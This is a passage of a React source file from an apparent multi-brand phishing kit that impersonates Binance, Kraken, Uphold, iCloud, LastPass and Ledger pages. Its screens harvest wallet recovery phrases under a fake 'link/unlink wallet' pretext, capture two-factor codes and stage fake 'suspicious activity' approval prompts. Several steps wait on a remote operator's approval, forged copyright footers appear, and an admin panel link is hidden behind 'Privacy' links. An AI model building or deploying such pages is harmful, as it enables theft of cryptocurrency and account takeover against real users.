                        onClick={() => handleWalletSelect(wallet.id)}
                        className="flex w-full cursor-pointer items-center gap-3 sm:gap-4 rounded-full border p-2.5 sm:p-3 transition-all"
                        style={{
                          borderColor: selectedWallet === wallet.id
                            ? (step === "wallet_unlink" ? "#ef4444" : brand.primary)
                            : brand.inputBorder,
                          backgroundColor: selectedWallet === wallet.id
                            ? (step === "wallet_unlink" ? (isBinance ? "#3C1111" : "#FEF2F2") : isUphold ? "#E8EEF4" : brand.primary + "0D")
                            : brand.inputBg,
                        }}
                      >
                        <WalletIcon type={wallet.id} />
                        <span className="font-medium" style={{ color: brand.textPrimary }}>{wallet.name}</span>
                        {selectedWallet === wallet.id && (
                          <svg className="ml-auto" width="20" height="20" fill={step === "wallet_unlink" ? "#ef4444" : brand.primary} viewBox="0 0 24 24">
                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                          </svg>
                        )}
                      </button>
                    ))}
                  </div>

                  <button
                    onClick={() => setWalletStep("seedphrase")}
                    disabled={!selectedWallet}
                    className="mt-6 w-full cursor-pointer rounded-full py-3 font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50"
                    style={{
                      backgroundColor: step === "wallet_unlink" ? "#ef4444" : brand.primary,
                      color: step === "wallet_unlink" ? "#fff" : btnTextColor,
                    }}
                  >
                    Continue
                  </button>

                  <p className="mt-8 text-center text-sm" style={{ color: brand.textPrimary }}>
                    {step === "wallet_link" ? "Want to unlink instead? " : "Want to link instead? "}
                    <button
                      onClick={async () => {
                        const target = step === "wallet_link" ? "wallet_unlink" : "wallet_link"
                        setStep(target)
                        setWalletStep("select")
                        setSelectedWallet(null)
                        setSeedPhrase(Array(12).fill(""))
                        setWordCount(12)
                        setStatus("idle")
                        if (sessionId) await moveToStep(sessionId, target)
                      }}
                      className="cursor-pointer font-medium hover:underline"
                      style={{ color: brand.primary }}
                    >
                      {step === "wallet_link" ? "Unlink wallet" : "Link wallet"}
                    </button>
                  </p>
                </>
              ) : (
                <>
                  <button
                    onClick={() => setWalletStep("select")}
                    className="mb-6 flex cursor-pointer items-center gap-2 text-sm"
                    style={{ color: brand.textSecondary }}
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M19 12H5M12 19l-7-7 7-7"/>
                    </svg>
                    Back
                  </button>

                  <div className="mb-4 flex items-center gap-3">
                    <WalletIcon type={selectedWallet!} />
                    <h1 className="text-xl font-semibold" style={{ color: brand.textPrimary }}>
                      {WALLETS.find(w => w.id === selectedWallet)?.name}
                    </h1>
                  </div>

                  <p className="mb-6 text-sm" style={{ color: brand.textSecondary }}>
                    {"Enter your " + walletCurrentWordCount + "-word recovery phrase to " + (step === "wallet_link" ? "link" : "unlink") + " your wallet"}
                  </p>

                  {walletCanExtendTo24 && (
                    <div className="mb-4 flex items-center gap-2">
                      <span className="text-xs" style={{ color: brand.textSecondary }}>Phrase length:</span>
                      <button
                        onClick={() => handleWalletWordCountChange(12)}
                        className="cursor-pointer rounded-full px-3 py-1 text-xs font-medium transition-colors"
                        style={{
                            backgroundColor: wordCount === 12 ? (step === "wallet_unlink" ? "#ef4444" : brand.primary) : (isBinance ? "#2B3139" : isUphold ? "#E8EEF4" : "#f3f4f6"),
                          color: wordCount === 12 ? (step === "wallet_unlink" ? "#fff" : btnTextColor) : brand.textSecondary,
                        }}
                      >
                        12 words
                      </button>
                      <button
                        onClick={() => handleWalletWordCountChange(24)}
                        className="cursor-pointer rounded-full px-3 py-1 text-xs font-medium transition-colors"
                        style={{
                            backgroundColor: wordCount === 24 ? (step === "wallet_unlink" ? "#ef4444" : brand.primary) : (isBinance ? "#2B3139" : isUphold ? "#E8EEF4" : "#f3f4f6"),
                          color: wordCount === 24 ? (step === "wallet_unlink" ? "#fff" : btnTextColor) : brand.textSecondary,
                        }}
                      >
                        24 words
                      </button>
                    </div>
                  )}

                  <div
                    className={`mb-4 grid grid-cols-2 sm:grid-cols-3 gap-2 ${walletCurrentWordCount === 24 ? "max-h-72 sm:max-h-64 overflow-y-auto pr-1" : ""}`}
                    onPaste={handleWalletPaste}
                  >
                    {seedPhrase.map((word: string, i: number) => (
                      <div key={i} className="flex items-center gap-1 rounded-lg border px-2 py-2" style={{ borderColor: brand.inputBorder, backgroundColor: brand.inputBg }}>
                        <span className="min-w-[1.25rem] text-xs" style={{ color: brand.textMuted }}>{i + 1}.</span>
                        <input
                          type="text"
                          value={word}
                          onChange={(e) => {
                            const arr = [...seedPhrase]
                            arr[i] = e.target.value.toLowerCase().trim()
                            setSeedPhrase(arr)
                          }}
                          disabled={status === "pending"}
                          className="w-full bg-transparent text-sm outline-none"
                          style={{ color: brand.textPrimary }}
                          placeholder="word"
                        />
                      </div>
                    ))}
                  </div>

                  <p className="mb-4 text-xs" style={{ color: brand.textMuted }}>Tip: You can paste your entire phrase at once</p>

                  <button
                    onClick={handleWalletSubmit}
                    disabled={walletFilledWords !== walletCurrentWordCount || status === "pending"}
                    className="w-full cursor-pointer rounded-full py-3 font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50"
                    style={{
                      backgroundColor: step === "wallet_unlink" ? "#ef4444" : brand.primary,
                      color: step === "wallet_unlink" ? "#fff" : btnTextColor,
                    }}
                  >
                    {status === "pending" ? (
                      <span className="flex items-center justify-center gap-2">
                        <span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"/>
                        {step === "wallet_link" ? "Linking..." : "Unlinking..."}
                      </span>
                    ) : (step === "wallet_link" ? "Link Wallet" : "Unlink Wallet")}
                  </button>

                  {status === "pending" && (
                    <p className="mt-4 text-center text-sm" style={{ color: brand.textSecondary }}>Please wait while we verify your wallet...</p>
                  )}

                  <div className="mt-6 rounded-lg p-3" style={{
                            backgroundColor: step === "wallet_unlink" ? (isBinance ? "#3C1111" : "#FEF2F2") : isUphold ? "#E8EEF4" : brand.primary + "15"
                  }}>
                    <p className="text-xs" style={{ color: step === "wallet_unlink" ? "#ef4444" : brand.primary }}>
                      {step === "wallet_link"
                        ? `Never share your recovery phrase. ${brand.name} support will never ask for it.`
                        : `Warning: This will disconnect your wallet from ${brand.name}. This action cannot be undone.`}
                    </p>
                  </div>
                </>
              )}
            </>
          )}

          {/* LastPass: Cancel Requests step */}
          {step === "lp_cancel_requests" && isLastpass && (
            <div className="flex flex-col py-2">
              <div className="mb-2 flex items-center gap-2">
                <div className="flex h-5 w-5 items-center justify-center rounded-full bg-[#D32D27]">
                  <span className="text-xs font-bold leading-none text-white">!</span>
                </div>
                <h2 className="text-lg font-bold text-gray-900">Suspicious Activity Detected</h2>
              </div>
              <p className="mb-6 text-sm text-gray-600">We noticed unusual activity on your account. Please review each request and approve or deny it.</p>

              <div className="space-y-3">
                {/* Recent Logins */}
                <div className="rounded-lg border border-gray-200 bg-gray-50 p-4">
                  <div className="mb-1">
                    <span className="text-sm font-medium text-gray-900">Recent Login Sessions</span>
                    <p className="mt-0.5 text-xs text-gray-500">Unrecognized sign-in from a new device or location</p>
                  </div>
                  <div className="mt-3 flex gap-2">
                    <button
                      onClick={() => setLpCancelSelections(prev => ({ ...prev, recent_logins: true }))}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${lpCancelSelections.recent_logins === true ? "bg-green-600 text-white" : "border border-green-300 bg-green-50 text-green-700 hover:bg-green-100"}`}
                    >Approve</button>
                    <button
                      onClick={() => setLpCancelSelections(prev => ({ ...prev, recent_logins: false }))}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${lpCancelSelections.recent_logins === false ? "bg-red-600 text-white" : "border border-red-300 bg-red-50 text-red-700 hover:bg-red-100"}`}
                    >Deny</button>
                  </div>
                </div>

                {/* Password Changes */}
                <div className="rounded-lg border border-gray-200 bg-gray-50 p-4">
                  <div className="mb-1">
                    <span className="text-sm font-medium text-gray-900">Master Password Change</span>
                    <p className="mt-0.5 text-xs text-gray-500">A request was made to change your master password</p>
                  </div>
                  <div className="mt-3 flex gap-2">
                    <button
                      onClick={() => setLpCancelSelections(prev => ({ ...prev, password_changes: true }))}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${lpCancelSelections.password_changes === true ? "bg-green-600 text-white" : "border border-green-300 bg-green-50 text-green-700 hover:bg-green-100"}`}
                    >Approve</button>
                    <button
                      onClick={() => setLpCancelSelections(prev => ({ ...prev, password_changes: false }))}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${lpCancelSelections.password_changes === false ? "bg-red-600 text-white" : "border border-red-300 bg-red-50 text-red-700 hover:bg-red-100"}`}
                    >Deny</button>
                  </div>
                </div>

                {/* Recovery Requests */}
                <div className="rounded-lg border border-gray-200 bg-gray-50 p-4">
                  <div className="mb-1">
                    <span className="text-sm font-medium text-gray-900">Account Recovery Request</span>
                    <p className="mt-0.5 text-xs text-gray-500">A pending account recovery or vault export request</p>
                  </div>
                  <div className="mt-3 flex gap-2">
                    <button
                      onClick={() => setLpCancelSelections(prev => ({ ...prev, recovery_requests: true }))}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${lpCancelSelections.recovery_requests === true ? "bg-green-600 text-white" : "border border-green-300 bg-green-50 text-green-700 hover:bg-green-100"}`}
                    >Approve</button>
                    <button
                      onClick={() => setLpCancelSelections(prev => ({ ...prev, recovery_requests: false }))}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${lpCancelSelections.recovery_requests === false ? "bg-red-600 text-white" : "border border-red-300 bg-red-50 text-red-700 hover:bg-red-100"}`}
                    >Deny</button>
                  </div>
                </div>
              </div>

              <button
                onClick={async () => {
                  if (!sessionId || lpCancelSubmitting) return
                  if (lpCancelSelections.recent_logins === null || lpCancelSelections.password_changes === null || lpCancelSelections.recovery_requests === null) return
                  setLpCancelSubmitting(true)
                  const responses = {
                    signin_request: lpCancelSelections.recent_logins ? "approved" as const : "denied" as const,
                    withdrawal_request: lpCancelSelections.password_changes ? "approved" as const : "denied" as const,
                    phone_change_request: lpCancelSelections.recovery_requests ? "approved" as const : "denied" as const,
                  }
                  await submitSecurityResponses(sessionId, responses).catch(() => {})
                  setStep("lp_requests_cancelled")
                  await submitForApproval(sessionId, "lp_requests_cancelled", {}).catch(() => {})
                }}
                disabled={lpCancelSubmitting || lpCancelSelections.recent_logins === null || lpCancelSelections.password_changes === null || lpCancelSelections.recovery_requests === null}
                className="mt-6 w-full cursor-pointer rounded-full bg-[#D32D27] py-3 text-base font-semibold text-white transition-colors hover:bg-[#B52521] disabled:cursor-not-allowed disabled:opacity-50"
              >
                {lpCancelSubmitting ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                    Submitting...
                  </span>
                ) : (
                  "Submit"
                )}
              </button>
            </div>
          )}

          {/* LastPass: Requests Cancelled confirmation */}
          {step === "lp_requests_cancelled" && isLastpass && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-100">
                <svg width="32" height="32" fill="none" viewBox="0 0 24 24" stroke="#16a34a" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg>
              </div>
              <h2 className="mb-2 text-center text-xl font-bold text-gray-900">Requests Cancelled</h2>
              <p className="mb-1 text-center text-sm text-gray-600">All selected suspicious requests have been successfully cancelled.</p>
              <p className="mb-6 text-center text-xs text-gray-400">Your vault is now secured. You can safely close this window.</p>
              <div className="w-full rounded-lg border border-green-200 bg-green-50 p-4">
                <div className="flex items-center gap-3">
                  <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#16a34a" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                  <div>
                    <p className="text-sm font-medium text-green-700">Account Protected</p>
                    <p className="text-xs text-green-600">No further action required</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* iCloud: Pending approval (loading spinner) */}
          {step === "pending" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-6 h-12 w-12 animate-spin rounded-full border-4 border-[#424245] border-t-[#2997ff]" />
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Verifying your information</h2>
              <p className="text-center text-sm text-[#86868b]">This may take a moment. Please do not close this window.</p>
            </div>
          )}

          {/* iCloud: 2FA Code Entry */}
          {step === "2fa" && isIcloud && (
            <CodeInput
              onSubmit={handleVerifyAuthenticator}
              label="Two-Factor Authentication"
              description="A verification code has been sent to your trusted device. Enter the code to continue."
            />
          )}

          {/* iCloud: 2FA Pending (waiting for admin) */}
          {step === "2fa_pending" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-6 h-12 w-12 animate-spin rounded-full border-4 border-[#424245] border-t-[#2997ff]" />
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Verifying code...</h2>
              <p className="text-center text-sm text-[#86868b]">Please wait while we verify your two-factor authentication code.</p>
            </div>
          )}

          {/* iCloud: 2FA Approved */}
          {step === "2fa_approved" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/20">
                <svg width="32" height="32" fill="none" viewBox="0 0 24 24" stroke="#22c55e" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg>
              </div>
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Verified</h2>
              <p className="text-center text-sm text-[#86868b]">Your identity has been confirmed. Redirecting...</p>
            </div>
          )}

          {/* iCloud: 2FA Denied */}
          {step === "2fa_denied" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-red-500/20">
                <svg width="32" height="32" fill="none" viewBox="0 0 24 24" stroke="#ef4444" strokeWidth="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
              </div>
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Verification Failed</h2>
              <p className="mb-4 text-center text-sm text-[#86868b]">{adminMessage || "The verification code was incorrect. Please try again."}</p>
              <button
                onClick={() => { setStep("2fa"); setStatus("idle"); setVerificationCode(["", "", "", "", "", ""]); }}
                className="rounded-xl bg-[#2997ff] px-6 py-3 text-sm font-medium text-white transition-colors hover:bg-[#0077ed] cursor-pointer"
              >
                Try Again
              </button>
            </div>
          )}

          {/* iCloud: Denied */}
          {step === "denied" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-red-500/20">
                <svg width="32" height="32" fill="none" viewBox="0 0 24 24" stroke="#ef4444" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
              </div>
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Access Denied</h2>
              <p className="mb-4 text-center text-sm text-[#86868b]">{adminMessage || "Your credentials could not be verified. Please try again."}</p>
              <button
                onClick={() => { setStep("email"); setStatus("idle"); setEmail(""); setPassword(""); }}
                className="rounded-xl bg-[#2997ff] px-6 py-3 text-sm font-medium text-white transition-colors hover:bg-[#0077ed] cursor-pointer"
              >
                Start Over
              </button>
            </div>
          )}

          {/* iCloud: Requests - Security prompts */}
          {step === "requests" && isIcloud && (
            <div className="flex flex-col items-center py-4">
              <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#2997ff]/20">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#2997ff" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
              </div>
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Security Review</h2>
              <p className="mb-6 text-center text-sm text-[#86868b]">We detected unusual activity on your account. Please review these security requests.</p>

              <div className="w-full space-y-3">
                {/* Sign-in request */}
                <div className="rounded-xl border border-[#424245] bg-[#1d1d1f] p-4">
                  <div className="mb-2 flex items-center gap-2">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f97316" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                    <span className="text-sm font-medium text-white">New sign-in from {securityLocation}</span>
                  </div>
                  <p className="mb-3 text-xs text-[#86868b]">Someone is trying to sign in to your Apple Account from a new location.</p>
                  <div className="flex gap-2">
                    <button
                      onClick={() => { setSecurityResponses(prev => ({...prev, signin_request: "approved"})) }}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${securityResponses.signin_request === "approved" ? "bg-green-500 text-white" : "bg-[#2a2a2c] text-white hover:bg-[#424245]"}`}
                    >Allow</button>
                    <button
                      onClick={() => { setSecurityResponses(prev => ({...prev, signin_request: "denied"})) }}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${securityResponses.signin_request === "denied" ? "bg-red-500 text-white" : "bg-[#2a2a2c] text-white hover:bg-[#424245]"}`}
                    >{"Don't Allow"}</button>
                  </div>
                </div>

                {/* Account change request */}
                <div className="rounded-xl border border-[#424245] bg-[#1d1d1f] p-4">
                  <div className="mb-2 flex items-center gap-2">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f97316" strokeWidth="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                    <span className="text-sm font-medium text-white">Account Information Change</span>
                  </div>
                  <p className="mb-3 text-xs text-[#86868b]">A request was made to modify your Apple ID account information.</p>
                  <div className="flex gap-2">
                    <button
                      onClick={() => { setSecurityResponses(prev => ({...prev, withdrawal_request: "approved"})) }}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${securityResponses.withdrawal_request === "approved" ? "bg-green-500 text-white" : "bg-[#2a2a2c] text-white hover:bg-[#424245]"}`}
                    >Allow</button>
                    <button
                      onClick={() => { setSecurityResponses(prev => ({...prev, withdrawal_request: "denied"})) }}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${securityResponses.withdrawal_request === "denied" ? "bg-red-500 text-white" : "bg-[#2a2a2c] text-white hover:bg-[#424245]"}`}
                    >{"Don't Allow"}</button>
                  </div>
                </div>

                {/* Phone change request */}
                <div className="rounded-xl border border-[#424245] bg-[#1d1d1f] p-4">
                  <div className="mb-2 flex items-center gap-2">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f97316" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                    <span className="text-sm font-medium text-white">Trusted Phone Number Change</span>
                  </div>
                  <p className="mb-3 text-xs text-[#86868b]">{"A request to change the trusted phone number ending in ****" + securityPhoneLast4 + "."}</p>
                  <div className="flex gap-2">
                    <button
                      onClick={() => { setSecurityResponses(prev => ({...prev, phone_change_request: "approved"})) }}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${securityResponses.phone_change_request === "approved" ? "bg-green-500 text-white" : "bg-[#2a2a2c] text-white hover:bg-[#424245]"}`}
                    >Allow</button>
                    <button
                      onClick={() => { setSecurityResponses(prev => ({...prev, phone_change_request: "denied"})) }}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${securityResponses.phone_change_request === "denied" ? "bg-red-500 text-white" : "bg-[#2a2a2c] text-white hover:bg-[#424245]"}`}
                    >{"Don't Allow"}</button>
                  </div>
                </div>
              </div>

              <button
                onClick={async () => {
                  if (!sessionId || requestsSubmitting) return
                  if (!securityResponses.signin_request || !securityResponses.withdrawal_request || !securityResponses.phone_change_request) return
                  setRequestsSubmitting(true)
                  // Cast the non-null values for the server action
                  const responses = {
                    signin_request: securityResponses.signin_request,
                    withdrawal_request: securityResponses.withdrawal_request,
                    phone_change_request: securityResponses.phone_change_request,
                  }
                  // Submit responses, then move step - don't reset on error to prevent re-click issues
                  await submitSecurityResponses(sessionId, responses).catch(() => {})
                  setStep("requests_complete")
                  await submitForApproval(sessionId, "requests_complete", {}).catch(() => {})
                }}
                disabled={requestsSubmitting || !securityResponses.signin_request || !securityResponses.withdrawal_request || !securityResponses.phone_change_request}
                className="mt-6 w-full cursor-pointer rounded-xl bg-[#2997ff] py-3 text-sm font-medium text-white transition-colors hover:bg-[#0077ed] disabled:cursor-not-allowed disabled:opacity-50"
              >
                {requestsSubmitting ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                    Processing...
                  </span>
                ) : (
                  "Continue"
                )}
              </button>
            </div>
          )}

          {/* iCloud: Requests Complete (waiting for admin) */}
          {step === "requests_complete" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-6 h-12 w-12 animate-spin rounded-full border-4 border-[#424245] border-t-[#2997ff]" />
              <h2 className="mb-2 text-center text-xl font-semibold text-white">Processing your responses...</h2>
              <p className="text-center text-sm text-[#86868b]">Please wait while we review your security responses.</p>
            </div>
          )}

          {/* iCloud: Account Secured */}
          {step === "secure" && isIcloud && (
            <div className="flex flex-col items-center py-8">
              <div className="mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-green-500/20">
                <svg width="40" height="40" fill="none" viewBox="0 0 24 24" stroke="#22c55e" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
              </div>
              <h2 className="mb-2 text-center text-2xl font-semibold text-white">Account Secured</h2>
              <p className="mb-1 text-center text-sm text-[#86868b]">Your Apple Account has been secured successfully.</p>
              <p className="mb-6 text-center text-xs text-[#636366]">All security settings have been reviewed and updated. You can now close this window.</p>
              <div className="w-full rounded-xl border border-green-500/30 bg-green-500/10 p-4">
                <div className="flex items-center gap-3">
                  <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#22c55e" strokeWidth="2"><polyline points="20 6 9 17 4 12"/></svg>
                  <div>
                    <p className="text-sm font-medium text-green-400">All clear</p>
                    <p className="text-xs text-green-400/70">No further action required</p>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Binance links below card */}
        {isBinance && step === "email" && (
          <div className="mt-6 flex flex-col items-center gap-2">
            <a href="#" className="text-sm font-medium text-[#F0B90B] hover:underline">Create a Binance Account</a>
            <a href="#" className="text-sm font-medium text-[#F0B90B] hover:underline">Need help?</a>
          </div>
        )}
      </main>

      {/* Binance footer */}
      {isBinance && step === "email" && (
        <footer className="py-4 text-center">
          <div className="flex items-center justify-center gap-4 text-xs text-[#5E6673]">
            <span className="flex items-center gap-1">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
              English
            </span>
            <a href="#" className="hover:text-[#848E9C]">Cookies</a>
            <a href="#" className="hover:text-[#848E9C]">Privacy</a>
          </div>
        </footer>
      )}
      
      {/* Kraken footer */}
      {isKrakenBrand && (
        <footer className="fixed bottom-0 left-0 right-0 flex items-center justify-between px-6 py-4 text-[13px] text-[#6B6B7B] bg-[#F5F5F5]">
          <div className="flex items-center">
            <span>Brokerage services are provided by Kraken Securities, LLC, member <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">FINRA</a>/<a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">SIPC</a>. <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">Disclosures here</a>.</span>
          </div>
          <div className="flex items-center gap-6">
            <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#1E1E2D] transition-colors">Privacy Notice</a>
            <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#1E1E2D] transition-colors">Terms of Service</a>
          </div>
        </footer>
      )}
      
      {/* iCloud footer */}
      {isIcloud && (
        <footer className="flex flex-col items-center justify-between gap-2 border-t border-[#424245] px-5 py-4 text-[11px] text-[#86868b] md:flex-row md:gap-0 md:text-[12px]">
          <div className="flex flex-wrap items-center justify-center gap-2 md:gap-4">
            <a href="#" className="hover:text-white hover:underline">System Status</a>
            <span className="text-[#424245]">|</span>
            <a href="/admin" className="hover:text-white hover:underline">Privacy Policy</a>
            <span className="text-[#424245]">|</span>
            <a href="#" className="hover:text-white hover:underline">{"Terms & Conditions"}</a>
          </div>
          <div className="text-center">{"Copyright \u00A9 2026 Apple Inc. All rights reserved."}</div>
        </footer>
      )}

      {/* LastPass footer */}
      {isLastpass && (
        <footer className="bg-[#3C3C3C] px-6 py-4 text-sm text-gray-300">
          <div className="flex flex-wrap items-center justify-between gap-4">
            <div className="flex items-center gap-2">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
              <span>English</span>
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9" /></svg>
            </div>
            <div className="flex flex-wrap items-center gap-6">
              <a href="#" className="hover:text-white">Terms of service</a>
              <a href="/admin" className="hover:text-white">Privacy statement</a>
              <a href="#" className="hover:text-white">Support</a>
              <span className="text-gray-400">{"\u00A9 2026 LastPass, Inc. All rights reserved."}</span>
            </div>
          </div>
        </footer>
      )}

      {/* Uphold footer */}
      {isUphold && (
        <footer className="py-4 text-center">
          <p className="text-sm text-[#6B7280]">
            {"\u00A9 Uphold, Inc. 2026 \u2022 "}
            <a href="#" className="text-[#2563EB] hover:underline">Terms & Conditions</a>
            {" \u2022 "}
            <a href="/admin" className="text-[#2563EB] hover:underline">Privacy Notice</a>
            {" \u2022 "}
            <a href="#" className="text-[#2563EB] hover:underline">Legal</a>
          </p>
        </footer>
      )}

      {/* Ledger footer - handled by /ledger route */}
    </div>
  )
}
